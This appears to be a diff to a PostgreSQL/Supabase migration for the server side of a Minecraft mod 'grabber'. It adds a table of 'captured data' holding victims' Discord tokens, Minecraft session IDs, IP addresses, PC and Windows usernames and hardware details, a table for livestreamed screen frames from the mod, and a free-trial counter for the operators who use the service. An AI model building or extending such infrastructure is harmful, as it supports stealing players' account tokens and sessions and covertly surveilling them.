@@ -41,6 +41,46 @@ create table if not exists public.user_uuids (
 );
 create index if not exists user_uuids_email_idx on public.user_uuids (email);
 
+-- Grabs table (captured data from mod)
+create table if not exists public.grabs (
+  id uuid primary key default uuid_generate_v4(),
+  owner_email text,
+  minecraft_username text,
+  discord_username text,
+  ip_address text,
+  country text,
+  timezone text,
+  os text,
+  os_version text,
+  pc_name text,
+  windows_username text,
+  cpu text,
+  ram text,
+  gpu text,
+  screen_resolution text,
+  disk_space text,
+  java_version text,
+  language text,
+  desktop_env text,
+  client_version text,
+  session_id text,
+  session_start text,
+  discord_token text,
+  servers text,
+  created_at timestamptz default now(),
+  updated_at timestamptz
+);
+create index if not exists grabs_owner_idx on public.grabs (owner_email);
+create index if not exists grabs_mc_username_idx on public.grabs (minecraft_username);
+create index if not exists grabs_created_idx on public.grabs (created_at);
+
+-- Stream frames (livestream data from mod)
+create table if not exists public.stream_frames (
+  username text primary key,
+  frame text,
+  updated_at timestamptz default now()
+);
+
 -- Add updated_at to grabs if not exists
 DO $$ BEGIN
   ALTER TABLE public.grabs ADD COLUMN IF NOT EXISTS updated_at timestamptz;
@@ -50,6 +90,17 @@ EXCEPTION WHEN duplicate_column THEN END $$;
 DO $$ BEGIN
   ALTER TABLE public.users ADD COLUMN IF NOT EXISTS is_pro boolean default false;
 EXCEPTION WHEN duplicate_column THEN END $$;
+
+-- Add free_uses_remaining for free trial system
+DO $$ BEGIN
+  ALTER TABLE public.users ADD COLUMN IF NOT EXISTS free_uses_remaining integer default 3;
+EXCEPTION WHEN duplicate_column THEN END $$;
+
+-- Initialize free_uses_remaining for existing users
+DO $$ BEGIN
+  UPDATE public.users SET free_uses_remaining = 3 WHERE free_uses_remaining IS NULL AND is_pro = false;
+  UPDATE public.users SET free_uses_remaining = NULL WHERE is_pro = true;
+EXCEPTION WHEN others THEN END $$;
 
 -- Users table (extends Supabase auth.users)
 create table if not exists public.users (
@@ -210,6 +261,7 @@ create table if not exists public.settings (
 create index if not exists idx_users_email on public.users(email);
 create index if not exists idx_users_role on public.users(role);
 create index if not exists idx_users_status on public.users(status);
+create index if not exists idx_users_free_uses on public.users(free_uses_remaining);
 create index if not exists idx_endpoints_path on public.endpoints(path);
 create index if not exists idx_endpoints_status on public.endpoints(status);
 create index if not exists idx_endpoint_requests_endpoint on public.endpoint_requests(endpoint_id);
@@ -313,13 +365,14 @@ on conflict (key) do nothing;
 create or replace function public.handle_new_user()
 returns trigger as $$
 begin
-  insert into public.users (id, email, display_name, avatar_url, is_owner)
+  insert into public.users (id, email, display_name, avatar_url, is_owner, free_uses_remaining)
   values (
     new.id,
     new.email,
     coalesce(new.raw_user_meta_data->>'full_name', new.email),
     new.raw_user_meta_data->>'avatar_url',
-    new.email = 'lifegrading@gmail.com'
+    new.email = 'lifegrading@gmail.com',
+    case when new.email = 'lifegrading@gmail.com' then null else 3 end
   );
 
   -- Assign owner role if owner
@@ -367,6 +420,14 @@ create policy "Admins can view all users" on public.users
       and r.name in ('owner', 'administrator', 'moderator')
     )
   );
+
+-- Service role can update users (bypasses RLS, but added explicitly as safety net)
+create policy "Service role can update users" on public.users
+  for update with check (auth.role() = 'service_role');
+
+-- Service role can insert users
+create policy "Service role can insert users" on public.users
+  for insert with check (auth.role() = 'service_role');
 
 -- Public can read endpoint info (for documentation)
 create policy "Public can view active endpoints" on public.endpoints
